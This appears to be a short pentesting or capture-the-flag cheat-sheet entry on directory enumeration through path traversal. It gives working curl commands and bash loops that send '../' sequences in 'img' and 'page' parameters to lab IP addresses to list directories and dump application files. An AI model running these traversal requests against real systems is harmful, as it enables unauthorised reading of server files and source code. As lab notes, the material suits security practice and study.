# Dir Enumeration

### Show directory on console.

```bash
# Run the curl commands on console. You may get the directory list
curl http://10.129.234.205:8080/show_image?img=../../../../../../var/
curl http://10.129.234.205:8080/show_image?img=../../../../../../var/www/WebApp
```

### Recursive display on files

{% code overflow="wrap" %}
```bash
# For loop in bash to show files
for i in HELP.md mvnw mvmd.cmd pom.xml src target; do echo ******$i; curl http://10.129.234.205:8080/show_image?img=../../../../../../var/www/WebApp/$i -o-;done 

# Another example
for i in $(cat lfi-input.txt | sed 's/[ ][ ]*/ /g' | cut -d ' ' -f 9 | sed 's/\"//g'); do echo "$i"; echo ""; curl http://10.129.23.184:8000/?page=../../../..$i -o -; done
```
{% endcode %}
